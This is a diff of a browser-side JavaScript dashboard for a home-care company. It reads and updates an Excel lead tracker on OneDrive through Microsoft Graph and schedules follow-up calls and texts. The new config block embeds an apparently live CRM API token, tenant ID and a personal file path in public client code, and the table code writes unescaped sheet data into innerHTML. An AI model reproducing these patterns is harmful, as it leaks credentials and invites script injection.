-var C={NO:0,DA:1,NM:2,PH:3,EM:4,AR:5,SO:6,SV:7,HR:8,ES:9,ST:10,LC:11,MT:12,NF:13,DM:14,PT:15,MV:16,AG:17,NT:18,SQ:19,SL:20,SD:21,SAFETY:22,REL:23,NSM:24};
-var EXCL=['lost','won','on hold'];
-// A lead is "active" (has responded before) if status contains contacted/active/assessment/proposal/negotiat/won
-var ACTIVE_ST=['contacted','active conversation','assessment','proposal','negotiat','won'];
+/* ────────────────────────────────────────────────────────────────────
+   CONFIG
+──────────────────────────────────────────────────────────────────── */
+var FN   = 'Solura_Lead_Tracker.xlsx';
+var GHL_LOC  = 'kWlzzI2WZaes2GnQf7DV';
+var GHL_KEY  = 'pit-5df912ec-7542-4dc8-af5b-272472ba84e9';
+var GHL_BASE = 'https://services.leadconnectorhq.com';
+var GR   = 'https://graph.microsoft.com/v1.0';
+var TN   = '1b2cdbea-de19-47d2-9512-ea102905e3eb';
+var RD   = 'https://aronsolurahomecarecom.github.io/solura-dashboard/Solura_Dashboard.html';
+var SC   = 'Files.ReadWrite.All Sites.ReadWrite.All User.Read offline_access';
+var SP   = '/personal/aron_solurahomecare_com/Documents/Solura_Lead_Tracker.xlsx';
 
-var tok=sessionStorage.getItem('st')||null,cid=localStorage.getItem('sc')||'1cb530f8-6c5f-4605-9590-068dd55e0b81',fid=null,rows=[],stOpts=[],drawerRi=null;
+/* Column map (0-indexed) */
+var C = {
+  NO:0, DA:1, NM:2, PH:3, EM:4, AR:5, SO:6, SV:7, HR:8, ES:9,
+  ST:10, LC:11, MT:12, NF:13, DM:14, PT:15, MV:16, AG:17, NT:18,
+  SQ:19, SL:20, SD:21, SAFETY:22, REL:23, NSM:24
+};
 
-window.addEventListener('load',async function(){
-  // Register service worker for PWA
-  if('serviceWorker' in navigator){
-    navigator.serviceWorker.register('sw.js').catch(function(){});
+/* Statuses to exclude from the dashboard */
+var EXCL = ['lost','won','on hold'];
+
+/* States that mean the lead has already responded / is engaged */
+var ACTIVE_ST = ['contacted','active conversation','assessment','proposal','negotiat','won'];
+
+/* ────────────────────────────────────────────────────────────────────
+   STATE
+──────────────────────────────────────────────────────────────────── */
+var tok        = sessionStorage.getItem('st') || null;
+var cidVal     = localStorage.getItem('sc')   || '1cb530f8-6c5f-4605-9590-068dd55e0b81';
+var fid        = null;
+var rows       = [];
+var stOpts     = [];
+var panelRi    = null;   /* row index currently shown in panel */
+var smsSendRi  = null;
+var emailSendRi= null;
+
+/* ────────────────────────────────────────────────────────────────────
+   BOOT
+──────────────────────────────────────────────────────────────────── */
+window.addEventListener('load', async function() {
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('sw.js').catch(function() {});
   }
+  el('cid').value = cidVal;
 
-  document.getElementById('cid').value=cid;
-  var p=new URLSearchParams(window.location.search),code=p.get('code'),state=p.get('state');
-  if(code&&state===localStorage.getItem('ps')){
-    window.history.replaceState({},document.title,window.location.pathname);
-    try{
-      var b=new URLSearchParams({client_id:cid,grant_type:'authorization_code',code:code,redirect_uri:RD,code_verifier:localStorage.getItem('pv'),scope:SC});
-      var r=await fetch('https://login.microsoftonline.com/'+TN+'/oauth2/v2.0/token',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b});
-      var j=await r.json();
-      if(j.access_token){tok=j.access_token;sessionStorage.setItem('st',tok);if(j.refresh_token)localStorage.setItem('sr',j.refresh_token);setTimeout(signedIn,0);return;}
-      showErr('Auth failed: '+(j.error_description||j.error||'unknown'));
-    }catch(e){showErr('Auth error: '+e.message);}
+  var p = new URLSearchParams(window.location.search);
+  var code = p.get('code'), state = p.get('state');
+  if (code && state === localStorage.getItem('ps')) {
+    window.history.replaceState({}, document.title, window.location.pathname);
+    try {
+      var b = new URLSearchParams({
+        client_id: cidVal, grant_type: 'authorization_code', code: code,
+        redirect_uri: RD, code_verifier: localStorage.getItem('pv'), scope: SC
+      });
+      var r = await fetch('https://login.microsoftonline.com/' + TN + '/oauth2/v2.0/token', {
+        method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: b
+      });
+      var j = await r.json();
+      if (j.access_token) {
+        tok = j.access_token;
+        sessionStorage.setItem('st', tok);
+        if (j.refresh_token) localStorage.setItem('sr', j.refresh_token);
+        signedIn(); return;
+      }
+      showErr('Auth failed: ' + (j.error_description || j.error || 'unknown'));
+    } catch(e) { showErr('Auth error: ' + e.message); }
     return;
   }
-  var rt=localStorage.getItem('sr');
-  if(rt&&!tok){
-    try{
-      var b2=new URLSearchParams({client_id:cid,grant_type:'refresh_token',refresh_token:rt,scope:SC});
-      var r2=await fetch('https://login.microsoftonline.com/'+TN+'/oauth2/v2.0/token',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:b2});
-      var j2=await r2.json();
-      if(j2.access_token){tok=j2.access_token;sessionStorage.setItem('st',tok);if(j2.refresh_token)localStorage.setItem('sr',j2.refresh_token);setTimeout(signedIn,0);return;}
-    }catch(e){}
+
+  /* Try refresh token */
+  var rt = localStorage.getItem('sr');
+  if (rt && !tok) {
+    try {
+      var b2 = new URLSearchParams({
+        client_id: cidVal, grant_type: 'refresh_token', refresh_token: rt, scope: SC
+      });
+      var r2 = await fetch('https://login.microsoftonline.com/' + TN + '/oauth2/v2.0/token', {
+        method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: b2
+      });
+      var j2 = await r2.json();
+      if (j2.access_token) {
+        tok = j2.access_token;
+        sessionStorage.setItem('st', tok);
+        if (j2.refresh_token) localStorage.setItem('sr', j2.refresh_token);
+        signedIn(); return;
+      }
+    } catch(e) {}
   }
-  if(tok)setTimeout(signedIn,0);
+  if (tok) signedIn();
 });
 
-async function genPKCE(){
-  try{
-    var v=Array.from(crypto.getRandomValues(new Uint8Array(32))).map(function(b){return b.toString(16).padStart(2,'0');}).join('');
-    var d=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(v));
-    var c=btoa(String.fromCharCode.apply(null,new Uint8Array(d))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
-    return{v:v,c:c};
-  }catch(e){var v2=Math.random().toString(36).repeat(4).substring(2,66);return{v:v2,c:v2};}
+/* ────────────────────────────────────────────────────────────────────
+   AUTH
+──────────────────────────────────────────────────────────────────── */
+async function genPKCE() {
+  try {
+    var v = Array.from(crypto.getRandomValues(new Uint8Array(32)))
+              .map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
+    var d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(v));
+    var c = btoa(String.fromCharCode.apply(null, new Uint8Array(d)))
+              .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+    return {v:v, c:c};
+  } catch(e) {
+    var v2 = Math.random().toString(36).repeat(4).substring(2, 66);
+    return {v:v2, c:v2};
+  }
 }
 
-async function signIn(){
-  try{
-    var c2=document.getElementById('cid').value.trim();
-    if(!c2){showErr('Please enter your Azure Client ID.');return;}
-    cid=c2;localStorage.setItem('sc',cid);
-    var pk=await genPKCE(),st=Math.random().toString(36).substring(2);
-    localStorage.setItem('pv',pk.v);localStorage.setItem('ps',st);
-    window.location.href='https://login.microsoftonline.com/'+TN+'/oauth2/v2.0/authorize'
-      +'?client_id='+encodeURIComponent(cid)+'&response_type=code'
-      +'&redirect_uri='+encodeURIComponent(RD)+'&scope='+encodeURIComponent(SC)
-      +'&response_mode=query&state='+st+'&code_challenge='+pk.c+'&code_challenge_method=S256';
-  }catch(e){showErr('Sign-in error: '+e.message);}
+async function signIn() {
+  var c2 = el('cid').value.trim();
+  if (!c2) { showErr('Please enter your Azure Client ID.'); return; }
+  cidVal = c2;
+  localStorage.setItem('sc', cidVal);
+  var pk = await genPKCE();
+  var st = Math.random().toString(36).substring(2);
+  localStorage.setItem('pv', pk.v);
+  localStorage.setItem('ps', st);
+  window.location.href =
+    'https://login.microsoftonline.com/' + TN + '/oauth2/v2.0/authorize'
+    + '?client_id=' + encodeURIComponent(cidVal)
+    + '&response_type=code'
+    + '&redirect_uri=' + encodeURIComponent(RD)
+    + '&scope=' + encodeURIComponent(SC)
+    + '&response_mode=query&state=' + st
+    + '&code_challenge=' + pk.c + '&code_challenge_method=S256';
 }
 
-function signedIn(){
-  el('ls').style.display='none';
-  show('btn-refresh');show('btn-out');
-  var sd=el('sdot');if(sd)sd.className='sdot live';
-  var sl=el('slabel');if(sl)sl.textContent='Connected to OneDrive';
+function signedIn() {
+  el('login-screen').style.display = 'none';
+  show('btn-refresh'); show('btn-out');
+  var sd = el('sdot'); if (sd) { sd.className = 's-dot live'; }
+  var sl = el('slabel'); if (sl) sl.textContent = 'Connected to OneDrive';
   loadData();
 }
-function signOut(){sessionStorage.clear();localStorage.removeItem('sr');location.reload();}
+function signOut() { sessionStorage.clear(); localStorage.removeItem('sr'); location.reload(); }
 
-async function loadData(){
-  spin('Loading your leads from OneDrive…');clearErr();
-  try{
-    var mr=await gf(GR+'/me/drive/root:'+SP);
-    if(mr.status===401){sessionStorage.clear();location.reload();return;}
-    if(mr.ok){var m=await mr.json();fid=m.id;}
-    else{
-      var sr=await gf(GR+'/me/drive/root/search(q=\''+FN+'\')');
-      var sj=await sr.json();
-      var f=(sj.value||[]).filter(function(x){return x.name===FN;})[0];
-      if(!f)throw new Error('"'+FN+'" not found in OneDrive.');
-      fid=f.id;
+/* ────────────────────────────────────────────────────────────────────
+   DATA LOADING
+──────────────────────────────────────────────────────────────────── */
+async function loadData() {
+  spin('Loading your leads from OneDrive…'); clearErr();
+  try {
+    /* Locate the file */
+    var mr = await gf(GR + '/me/drive/root:' + SP);
+    if (mr.status === 401) { sessionStorage.clear(); location.reload(); return; }
+    if (mr.ok) {
+      var m = await mr.json(); fid = m.id;
+    } else {
+      var sr = await gf(GR + '/me/drive/root/search(q=\'' + FN + '\')');
+      var sj = await sr.json();
+      var f = (sj.value || []).filter(function(x) { return x.name === FN; })[0];
+      if (!f) throw new Error('"' + FN + '" not found in OneDrive.');
+      fid = f.id;
     }
-    var dr=await fetch(GR+'/me/drive/items/'+fid+'/content',{headers:{Authorization:'Bearer '+tok}});
-    if(!dr.ok)throw new Error('Download failed: '+dr.status);
-    var buf=await dr.arrayBuffer();
-    var wb=XLSX.read(buf,{type:'array',cellDates:true});
-    var ws=wb.Sheets['Lead Tracker'];
-    if(!ws)throw new Error("No 'Lead Tracker' tab found.");
-    rows=XLSX.utils.sheet_to_json(ws,{header:1,raw:false,dateNF:'yyyy-mm-dd'});
-    var ss=new Set(['New','Contacted','No answer','Active Conversation','Needs Assessment','Assessment Scheduled','Proposal Sent','Negotiating','Won – Active','Lost','On Hold']);
-    for(var i=3;i<rows.length;i++){var s=rows[i][C.ST];if(s&&String(s).trim())ss.add(String(s).trim());}
-    stOpts=Array.from(ss).sort();
-    buildUI();
-    var lr=el('lref');if(lr)lr.textContent='Refreshed: '+new Date().toLocaleTimeString('en-US',{hour:'numeric',minute:'2-digit'});
-    if(drawerRi!==null)openDrawer(drawerRi);
-  }catch(e){showErr(e.message);}finally{unspin();}
-}
-
-async function writeRow(ri,updates){
-  var cols='ABCDEFGHIJKLMNOPQRSTUVWXY',exRow=ri+1,base=GR+'/me/drive/items/'+fid+'/workbook';
-  var ents=Object.entries(updates);
-  for(var ei=0;ei<ents.length;ei++){
-    var ci=ents[ei][0],val=ents[ei][1],addr=cols[parseInt(ci)]+exRow;
-    var url2=base+"/worksheets/Lead%20Tracker/range(address='" + addr + "')";
-    var res=await fetch(url2,{
-      method:'PATCH',headers:{Authorization:'Bearer '+tok,'Content-Type':'application/json'},
-      body:JSON.stringify({values:[[val]]})
+    /* Download & parse */
+    var dr = await fetch(GR + '/me/drive/items/' + fid + '/content', {
+      headers: {Authorization: 'Bearer ' + tok}
     });
-    if(!res.ok){var er=await res.json().catch(function(){return{};});throw new Error('Save failed: '+(er.error?er.error.message:res.status));}
+    if (!dr.ok) throw new Error('Download failed: ' + dr.status);
+    var buf = await dr.arrayBuffer();
+    var wb  = XLSX.read(buf, {type:'array', cellDates:true});
+    var ws  = wb.Sheets['Lead Tracker'];
+    if (!ws) throw new Error("No 'Lead Tracker' tab found.");
+    rows = XLSX.utils.sheet_to_json(ws, {header:1, raw:false, dateNF:'yyyy-mm-dd'});
+
+    /* Collect status options */
+    var ss = new Set(['New','Contacted','No answer','Active Conversation',
+      'Needs Assessment','Assessment Scheduled','Proposal Sent','Negotiating',
+      'Won – Active','Lost','On Hold']);
+    for (var i = 3; i < rows.length; i++) {
+      var s = rows[i][C.ST];
+      if (s && String(s).trim()) ss.add(String(s).trim());
+    }
+    stOpts = Array.from(ss).sort();
+
+    buildUI();
+    var ref = el('data-ref');
+    if (ref) ref.textContent = 'Refreshed: ' + new Date().toLocaleTimeString('en-US',{hour:'numeric',minute:'2-digit'});
+    if (panelRi !== null) openPanel(panelRi);
+  } catch(e) { showErr(e.message); }
+  finally { unspin(); }
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   WRITE TO EXCEL
+──────────────────────────────────────────────────────────────────── */
+async function writeRow(ri, updates) {
+  var cols = 'ABCDEFGHIJKLMNOPQRSTUVWXY', exRow = ri + 1;
+  var base = GR + '/me/drive/items/' + fid + '/workbook';
+  var ents = Object.entries(updates);
+  for (var ei = 0; ei < ents.length; ei++) {
+    var ci  = ents[ei][0];
+    var val = ents[ei][1];
+    var addr = cols[parseInt(ci)] + exRow;
+    var url  = base + "/worksheets/Lead%20Tracker/range(address='" + addr + "')";
+    var res  = await fetch(url, {
+      method: 'PATCH',
+      headers: {Authorization:'Bearer '+tok, 'Content-Type':'application/json'},
+      body: JSON.stringify({values: [[val]]})
+    });
+    if (!res.ok) {
+      var er = await res.json().catch(function() { return {}; });
+      throw new Error('Save failed: ' + (er.error ? er.error.message : res.status));
+    }
   }
 }
 
-// Sequence
-function seqP(d){
-  if(d<=1)return{p:1,lbl:'Phase 1'};
-  if(d<=10)return{p:2,lbl:'Phase 2 · Day '+d};
-  if(d<=42)return{p:3,lbl:'Phase 3 · Wk '+(Math.floor((d-10)/7)+2)};
-  if(d<=49)return{p:4,lbl:'Phase 4'};
-  return{p:5,lbl:'Phase 5'};
+/* ────────────────────────────────────────────────────────────────────
+   ACTION-BASED SEQUENCE ENGINE
+
+   Rules:
+   - Phase position is determined by what has been LOGGED (SL column),
+     NOT by how many days have passed since the lead was added.
+   - Phases: 1=New, 2=Active follow-up (AM+PM), 3=Weekly, 4=Re-engage, 5=Nurture
+──────────────────────────────────────────────────────────────────── */
+function getNextAction(lead) {
+  /* Active leads (have responded) get a simple "check in" prompt */
+  if (lead.active) return null;
+
+  var log     = lead.seqLast || '';
+  var entries = log ? log.split('|').map(function(s) { return s.trim(); }) : [];
+
+  /* ── Phase 1: New lead outreach ── */
+  var hasIntroText  = entries.some(function(e) { return e.toLowerCase().indexOf('intro text') > -1; });
+  var hasFirstCall  = entries.some(function(e) { return e.toLowerCase().indexOf('first call') > -1; });
+  var hasSecondCall = entries.some(function(e) { return e.toLowerCase().indexOf('second call') > -1; });
+  var hasMissedYou  = entries.some(function(e) { return e.toLowerCase().indexOf('missed you') > -1; });
+
+  if (!hasIntroText)  return {icon:'💬', text:'Send intro text + notify calling in 5 min', phase:1};
+  if (!hasFirstCall)  return {icon:'📞', text:'First call (5 min after text)', phase:1};
+  if (!hasSecondCall) return {icon:'📞', text:'Second call attempt', phase:1};
+  if (!hasMissedYou)  return {icon:'💬', text:'Send missed-you text', phase:1};
+
+  /* ── Phase 2: AM + PM follow-up calls ── */
+  var amCalls  = entries.filter(function(e) { return e.toLowerCase().indexOf('am call') > -1; }).length;
+  var pmEvents = entries.filter(function(e) {
+    return e.toLowerCase().indexOf('pm call') > -1 || e.toLowerCase().indexOf('pm text') > -1;
+  }).length;
+
+  if (amCalls < 10) {
+    var dayNum = amCalls + 1;
+    if (amCalls > pmEvents) {
+      /* AM done, PM still needed */
+      var pmType = (dayNum % 2 === 0) ? 'PM Text' : 'PM Call';
+      var pmIcon = (dayNum % 2 === 0) ? '💬' : '📞';
+      return {icon: pmIcon, text: pmType + ' — Day ' + dayNum, phase: 2};
+    }
+    /* Need the AM call for this day */
+    return {icon:'📞', text:'AM Call — Day ' + dayNum, phase: 2};
+  }
+
+  /* ── Phase 3: Weekly nurture ── */
+  var weeklies = entries.filter(function(e) {
+    return e.toLowerCase().indexOf('week') > -1 || e.toLowerCase().indexOf('nurture') > -1;
+  }).length;
+
+  if (weeklies < 6) {
+    return {icon:'💬', text:'Week ' + (weeklies + 1) + ' outreach — text or email', phase:3};
+  }
+
+  /* ── Phase 4: 6-week re-engagement ── */
+  var hasReEngage = entries.some(function(e) { return e.toLowerCase().indexOf('re-engagement') > -1; });
+  var hasVoicemail = entries.some(function(e) { return e.toLowerCase().indexOf('voicemail') > -1; });
+  if (!hasReEngage) return {icon:'📞', text:'6-week re-engagement call', phase:4};
+  if (!hasVoicemail) return {icon:'📞', text:'Leave voicemail + follow-up text', phase:4};
+
+  /* ── Phase 5: Long-term nurture ── */
+  return {icon:'💬', text:'Long-term nurture — text or email', phase:5};
 }
-function nextAct(p,last,d){
-  var l=last||'';
-  if(p===1){
-    if(!l)return{icon:'💬',text:'Send intro text + notify calling in 5 min'};
-    if(l.indexOf('Intro text')>-1)return{icon:'📞',text:'First call (5 min after text)'};
-    if(l.indexOf('First call')>-1)return{icon:'📞',text:'Second call attempt'};
-    if(l.indexOf('Second call')>-1)return{icon:'💬',text:'Send missed you text'};
-    return null;
+
+function getPhaseLabel(lead) {
+  if (lead.active) {
+    var st = lead.status.toLowerCase();
+    if (st.indexOf('assessment') > -1) return 'Assessment Stage';
+    if (st.indexOf('proposal') > -1)   return 'Proposal Stage';
+    if (st.indexOf('negotiat') > -1)   return 'Negotiating';
+    return 'Active Conversation';
   }
-  if(p===2){
-    // seqLast is a pipe-separated log: "AM Call — Day 5 | PM Call — Day 5 | AM Call — Day 6"
-    var amTag='AM Call — Day '+d;
-    var pmTag1='PM Call — Day '+d;
-    var pmTag2='PM Text — Day '+d;
-    var amDone=(l.indexOf(amTag)>-1);
-    var pmDone=(l.indexOf(pmTag1)>-1||l.indexOf(pmTag2)>-1);
-    if(!amDone)return{icon:'📞',text:amTag};
-    if(!pmDone)return{icon:(d%2===0?'💬':'📞'),text:(d%2===0?'PM Text':'PM Call')+' — Day '+d};
-    return null;
+  var na = lead.na;
+  if (!na) return 'Sequence complete';
+  switch(na.phase) {
+    case 1: return 'Phase 1 — New Lead';
+    case 2: return 'Phase 2 — Daily Follow-up';
+    case 3: return 'Phase 3 — Weekly Nurture';
+    case 4: return 'Phase 4 — Re-engagement';
+    case 5: return 'Phase 5 — Long-term';
+    default: return '';
   }
-  if(p===3){var din=(d-10)%7;if(din===0)return{icon:'💬',text:'Week '+(Math.floor((d-10)/7)+2)+' outreach — text or email'};return null;}
-  if(p===4){
-    if(l.indexOf('Re-engagement')===-1)return{icon:'📞',text:'6-week re-engagement call'};
-    if(l.indexOf('Voicemail')===-1)return{icon:'📞',text:'Leave voicemail + follow-up text'};
-    return null;
-  }
-  if(d%7===0)return{icon:'💬',text:'Weekly nurture — text or email'};
+}
+
+function isActive(st) {
+  return ACTIVE_ST.some(function(x) { return st.toLowerCase().indexOf(x) > -1; });
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   DATE HELPERS
+──────────────────────────────────────────────────────────────────── */
+function pd(v) {
+  if (!v && v !== 0) return null;
+  if (v instanceof Date) return v;
+  var s = String(v).trim();
+  if (/^\d{4,6}$/.test(s)) return new Date((parseInt(s) - 25569) * 86400000);
+  var m = s.match(/^(\d{4})-(\d{2})-(\d{2})/);
+  if (m) return new Date(+m[1], +m[2]-1, +m[3]);
+  m = s.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})/);
+  if (m) return new Date(+m[3], +m[1]-1, +m[2]);
+  var nd = new Date(s);
+  if (!isNaN(nd)) return nd;
   return null;
 }
-function isActive(st){return ACTIVE_ST.some(function(x){return st.toLowerCase().indexOf(x)>-1;});}
+function ds(d)   { return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0'); }
+function fmtDate(d) { return d ? d.toLocaleDateString('en-US', {month:'short', day:'numeric', year:'numeric'}) : ''; }
 
-// Date helpers
-function pd(v){
-  if(!v&&v!==0)return null;if(v instanceof Date)return v;
-  var s=String(v).trim();
-  if(/^\d{4,6}$/.test(s))return new Date((parseInt(s)-25569)*86400000);
-  var m=s.match(/^(\d{4})-(\d{2})-(\d{2})/);if(m)return new Date(+m[1],+m[2]-1,+m[3]);
-  m=s.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})/);if(m)return new Date(+m[3],+m[1]-1,+m[2]);
-  var nd=new Date(s);if(!isNaN(nd))return nd;return null;
-}
-function ds(d){return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');}
-function fd2(d){return(d.getMonth()+1)+'/'+d.getDate()+'/'+d.getFullYear();}
+/* ────────────────────────────────────────────────────────────────────
+   BUILD UI
+──────────────────────────────────────────────────────────────────── */
+function buildUI() {
+  var now = new Date();
+  var ts  = ds(now);
+  var td  = new Date(ts);                              /* today midnight */
+  var wd  = new Date(td.getTime() + 7 * 86400000);    /* +7 days */
+  var tMs = td.getTime();
 
-function buildUI(){
-  var now=new Date(),ts=ds(now),td=new Date(ts),wd=new Date(td.getTime()+7*86400000);
-  var od=[],td2=[],wk=[],al=[],allL=[],svSet=new Set();
-  for(var i=3;i<rows.length;i++){
-    var r=rows[i],name=r[C.NM];if(!name)continue;
-    var st=String(r[C.ST]||'').trim();
-    if(EXCL.some(function(x){return st.toLowerCase().indexOf(x)>-1;}))continue;
-    al.push(name);
-    var da=pd(r[C.DA]),daysOld=da?Math.max(0,Math.round((td-new Date(da.getFullYear(),da.getMonth(),da.getDate()))/86400000)):0;
-    var si=seqP(daysOld),sl=r[C.SL]||'',active=isActive(st);
-    var na=active?null:nextAct(si.p,sl,daysOld);
-    var sv=r[C.SV];if(sv&&String(sv).trim())svSet.add(String(sv).trim());
-    var fuRaw=r[C.NF],fu=fuRaw?pd(fuRaw):null;
-    var afud=fu&&!isNaN(fu)?new Date(fu.getFullYear(),fu.getMonth(),fu.getDate()):null;
-    var fuStr=afud?ds(afud):'';
-    var lead={ri:i,no:r[C.NO],name:name,phone:r[C.PH]||'',email:r[C.EM]||'',status:st,
-      method:r[C.MT]||'',dm:r[C.DM]||'',notes:r[C.NT]||'',daysOld:daysOld,
-      seqP:si.p,seqLbl:si.lbl,seqLast:sl,na:na,active:active,fu:afud,fuStr:fuStr};
+  var od = [], td2 = [], wk = [], allL = [];
+  var totalNames = [];
+
+  for (var i = 3; i < rows.length; i++) {
+    var r    = rows[i];
+    var name = r[C.NM];
+    if (!name) continue;
+    var st = String(r[C.ST] || '').trim();
+    if (EXCL.some(function(x) { return st.toLowerCase().indexOf(x) > -1; })) continue;
+
+    totalNames.push(name);
+    var da      = pd(r[C.DA]);
+    var daysOld = da ? Math.max(0, Math.round((td - new Date(da.getFullYear(), da.getMonth(), da.getDate())) / 86400000)) : 0;
+    var active  = isActive(st);
+    var fuRaw   = r[C.NF];
+    var fu      = fuRaw ? pd(fuRaw) : null;
+    var afud    = (fu && !isNaN(fu)) ? new Date(fu.getFullYear(), fu.getMonth(), fu.getDate()) : null;
+    var fuStr   = afud ? ds(afud) : '';
+
+    var lead = {
+      ri:       i,
+      no:       r[C.NO],
+      name:     name,
+      phone:    r[C.PH]   || '',
+      email:    r[C.EM]   || '',
+      area:     r[C.AR]   || '',
+      source:   r[C.SO]   || '',
+      services: r[C.SV]   || '',
+      hours:    r[C.HR]   || '',
+      status:   st,
+      method:   r[C.MT]   || '',
+      dm:       r[C.DM]   || '',
+      payType:  r[C.PT]   || '',
+      moveIn:   r[C.MV]   || '',
+      agreed:   r[C.AG]   || '',
+      notes:    r[C.NT]   || '',
+      seqLast:  r[C.SL]   || '',
+      safety:   r[C.SAFETY] || '',
+      rel:      r[C.REL]  || '',
+      nsm:      r[C.NSM]  || '',
+      daysOld:  daysOld,
+      active:   active,
+      fu:       afud,
+      fuStr:    fuStr
+    };
+
+    lead.na = getNextAction(lead);
+    lead.phaseLabel = getPhaseLabel(lead);
+
     allL.push(lead);
-    if(afud){
-      var actionDue=(na!==null);
-      if(fuStr<ts)od.push(copyLead(lead));
-      else if(fuStr===ts&&(active||actionDue))td2.push(copyLead(lead));
-      else if(afud>td&&afud<=wd&&(active||actionDue))wk.push(copyLead(lead));
+
+    if (afud) {
+      if (fuStr < ts) {
+        od.push(lead);
+      } else if (fuStr === ts) {
+        td2.push(lead);
+      } else if (afud <= wd) {
+        wk.push(lead);
+      }
     }
   }
-  window._services=Array.from(svSet).sort();
-  od.sort(function(a,b){return a.fu-b.fu;});wk.sort(function(a,b){return a.fu-b.fu;});
-  allL.sort(function(a,b){if(!a.fu&&!b.fu)return 0;if(!a.fu)return 1;if(!b.fu)return -1;return a.fu-b.fu;});
-  ['kv0','kv1','kv2','kv3'].forEach(function(id,i){var e=el(id);if(e)e.textContent=[od,td2,wk,al][i].length;});
-  ['c0','c1','c2'].forEach(function(id,i){var n=[od,td2,wk][i].length;var e=el(id);if(e)e.textContent=n+' lead'+(n!==1?'s':'');});
-  var tMs=td.getTime();
-  var t0=el('t0');if(t0)t0.innerHTML=buildTbl(od,'od',tMs);
-  var t1=el('t1');if(t1)t1.innerHTML=buildTbl(td2,'td',tMs);
-  var t2=el('t2');if(t2)t2.innerHTML=buildTbl(wk,'wk',tMs);
-  var c3=el('c3');if(c3)c3.textContent=allL.length+' lead'+(allL.length!==1?'s':'');
-  var t3=el('t3');if(t3)t3.innerHTML=buildTbl(allL,'all',tMs);
-  var kb=el('kbar');if(kb)kb.style.display='grid';
-  var mn=el('main');if(mn)mn.classList.add('vis');
-}
-function copyLead(l){return Object.assign({},l,{fu:l.fu?new Date(l.fu.getTime()):null});}
 
-function sbadge(s){
-  var sl=s.toLowerCase();
-  var c=sl.indexOf('active conversation')>-1?'bac':sl.indexOf('contact')>-1?'bc':sl.indexOf('assessment')>-1?'bas':sl.indexOf('proposal')>-1?'bp':sl.indexOf('negotiat')>-1?'bng':sl.indexOf('no answer')>-1?'bna':'bn';
-  return'<span class="badge '+c+'">'+s+'</span>';
-}
-var MOPS=['','Phone call','SMS','Email','In person','Left voicemail','No answer'];
-
-function buildTbl(leads,type,tMs){
-  var def3=new Date();def3.setDate(def3.getDate()+3);
-  if(!leads.length){
-    var msgs={od:'No overdue follow-ups — great work!',td:'Nothing due today.',wk:'No follow-ups scheduled this week.'};
-    return'<div class="empty">'+msgs[type]+'</div>';
+  /* Sort */
+  function sortByFu(a, b) {
+    if (!a.fu && !b.fu) return 0;
+    if (!a.fu) return 1;
+    if (!b.fu) return -1;
+    return a.fu - b.fu;
   }
-  var rhtml=leads.map(function(l){
-    var rowHtml='';
-    var fMs=l.fu?l.fu.getTime():null;
-    var pill=!fMs?'<span class="pill" style="background:#F0EFF4;color:#6B6980">No date</span>'
-            :type==='od'?'<span class="pill pr2">'+Math.round((tMs-fMs)/86400000)+'d overdue</span>'
-            :type==='td'?'<span class="pill pa">Due today</span>'
-            :type==='all'&&fMs<tMs?'<span class="pill pr2">'+Math.round((tMs-fMs)/86400000)+'d overdue</span>'
-            :type==='all'&&fMs===tMs?'<span class="pill pa">Due today</span>'
-            :'<span class="pill pg">in '+Math.round((fMs-tMs)/86400000)+'d</span>';
-    var fuD=l.fu?l.fu.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'}):'';
-    var cleanPh=l.phone?l.phone.replace(/\D/g,''):'';
-    var ph=l.phone?'<a class="ph" href="#" onclick="event.stopPropagation();event.preventDefault();window.open(\'https://app.homecaregrow.io/v2/location/kWlzzI2WZaes2GnQf7DV/contacts?search=\'+encodeURIComponent(\'+1'+cleanPh+'\')+\'\',\'hcg\',\'width=1100,height=750,noopener\')">📞 '+l.phone+'</a>':'';
-    var em=l.email?'<a class="em" href="mailto:'+l.email+'" onclick="event.stopPropagation()">✉ '+l.email+'</a>':'';
-    var naHtml=l.na?'<div class="snxt">'+l.na.icon+' '+l.na.text+'</div>':'<div class="snxt" style="color:var(--soft)">✓ Complete for today</div>';
-    var pid='ep-'+l.ri;
-    // Determine buttons based on active status
-    // Active lead (has responded before): show Update only
-    // No-answer lead: show Done + Responded
-    var btns='';
-    if(l.active){
-      // Next suggested method for active leads (col NSM)
-      var nsm=rows[l.ri]?String(rows[l.ri][C.NSM]||'').trim():'';
-      var nsmIsCall=(nsm.toLowerCase().indexOf('phone')>-1||nsm.toLowerCase().indexOf('call')>-1);
-      var nsmIsSMS=(nsm.toLowerCase().indexOf('sms')>-1||nsm.toLowerCase().indexOf('text')>-1);
-      var nsmIsEmail=(nsm.toLowerCase().indexOf('email')>-1);
-      var activeMainBtn='';
-      if(nsmIsCall){
-        activeMainBtn='<button class="rb-primary" style="background:var(--sky-deep);color:#fff;border:none" onclick="event.stopPropagation();dialHCG(\''+l.phone+'\')">📞 Call Now</button>';
-      } else if(nsmIsSMS){
-        activeMainBtn='<button class="rb-primary" style="background:var(--grn);color:#fff;border:none" onclick="event.stopPropagation();openSMS('+l.ri+')">💬 Send Text</button>';
-      } else if(nsmIsEmail){
-        activeMainBtn='<button class="rb-primary" style="background:var(--gold);color:#fff;border:none" onclick="event.stopPropagation();openEmail('+l.ri+')">✉ Send Email</button>';
-      } else {
-        activeMainBtn='<button class="rb-primary" style="background:var(--sky-deep);color:#fff;border:none" onclick="event.stopPropagation();dialHCG(\''+l.phone+'\')">📞 Call Now</button>';
-      }
-      var activeAltBtns='';
